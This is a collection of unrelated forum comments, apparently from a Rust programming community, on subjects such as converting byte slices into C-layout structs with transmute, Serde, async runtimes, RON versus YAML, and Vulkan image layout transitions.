Hello, I am wondering, if there is an better way to transmuting a slice of bytes into an struct than with `std::mem::transmute`. The incoming data are from an middle-ware, which sends C structs (as is) through a UNIX socket, in Rust I receive an (complete struct in) byte slice and than transmuting it into the `repr(C)` Rust struct. Is there a fast way, to remove unsafe `std::mem::transmute`?
Nice thanks so much for the tips. I'll be sure to make the changes.
Serde generates you the code for visiting structures and can be used for that.
I feel this is beyond what most people learn in a normal graduate degree. I have that, with a focus on PL design &amp; implementation, and I'm not 100% sure what's going on here.
What problems bare you having with the driver? Also which one are you using?
Turning a byte slice into a struct is (pretty much) always going to be unsafe; what's the problem with using `transmute`?
Why are my slides so fucking greeeeeeen?!
Out of curiosity, is there an accepted pattern for in-repo non-rust-dev focused docs? Ie, I could put all my docs in the standard rust API docs, but I don't want devs to have to locally build the docs. The nice thing about the README and markdown based docs is that they can be read from Github. Now, I know, docs.rs is great but I'm saying this in the context of internal company repos. Markdown on Github just seems a bit more friendly for high level documentation - and having that testes is nice too. Thoughts? I ask because I'm new(ish) to Rust, and want to make sure I'm not missing something.
Haven’t played with it no. I would need to figure out how to make codemirror play nice and because of the static site’s template limitations I needed to dynamically load all the js which is kind of clunky. Will take a look!
I’m surprised all the STRIPS style planning stuff went away. I looked and feels like all research stopped in the late 90s? Maybe your familiar with what happened next in the field? I’d be very curious to know. Anyway will tinker with a more impressive problem domain. 
Hahha didnt realize that. I swear it’s doing stuff! 
I've no doubt that it's doing _something_.
Tokio works with futures, Riker seems to be built on the actor model. I may be biased since I've never used the actor model, but since futures 0.3 with async await is coming up (already usable on nightly!), I'd opt for futures 0.3 with tokio. Writing async code is just so much more convenient.
Generally, one should try to use the tools with least power. Transmute is the second most powerful function that exists. So looking for an alternate tool is a good thing. &amp;#x200B; That said, there probably isn't anything better in this case, other than parsing it directly.
You've already got an answer as to why this doesn't work, but for what does work, you want the Entry api: [https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=e916c14892abab9e05eb60f106fd3e5d](https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=e916c14892abab9e05eb60f106fd3e5d)
can you elaborate? 
I'm not familiar with Vulkano, only Vulcan, but it looks like you're missing an image transition. Images in Vulkan are, at any given time, in one of a few different layouts and most functions will fail if an image is in the wrong layout. You need to transition the image to the correct layout to be able to use it in your compute pipeline, and then presumably transition it again to the correct layout for presentation to the window surface. I'm not sure exactly how to do this with Vulkano and a compute pipeline, but look into image transitions in general. Hope that helps.
It looks nice to me \^\^ It is definately a driver (installation/path) issue. I'm using Linux (Ubuntu) after all, and GPU drivers are a known pain point.
Fair enough. To be honest, if actually working with it in a different language isn't necessary, I feel a preference for RON because YAML has proven itself to have problems with consistent implementation, while RON still has a chance to turn out well on that front.
RON will never have other implementations is my guess. 
async/await is like green threads, right?
Essentially, Serde is a data mapper. The adapter to data formats is the `Serialize` trait, which walks through the data and triggers callbacks on your Serializer implementation. In can (and is) used to generically implement data mappings from memory to memory: https://serde.rs/impl-serializer.html Your structs need to `derive(Serialize)` though, which might generate a fair bit of code.
Possibly. As someone with a strong UI/UX focus, I feel an aversion to using something that gives a false impression of cross-compatibility so, when I don't anticipate ever using it in anything other than the one language, I prefer the format that is explicit and honest about only having one implementation. (Essentially, "I'm using Rust for its strong compile-time guarantees. I don't want to use something that becomes the serialization format analogue to Python's runtime exceptions when used in a cross-language context.") ...plus, I could always use rust-cpython or neon or helix to expose the one RON implementation to another language if I discover my "never need other languages" assessment is in error.
Concerning the benchmarks, doesn't taking the middle element as the search value massively benefit the binary search? As in, the middle element is always going to be the first one probed? &amp;#x200B;
I was thinking it, I was too afraid to say it xD
Excellent point! I have thought about this and actually tried to do the worst case by taking the mid-point (rounded down) and \*then\* subtracting by one! I believe this should cause a binary search to take the maximum number of comparisons. Please correct me if I am wrong here or made an implementation error however :-)
I also use old reddit but, when it goes away, the simplest solution is to install [Stylus](https://github.com/openstyles/stylus/), whip up a quick userstyle to override the background on the appropriate DOM node, and then move on.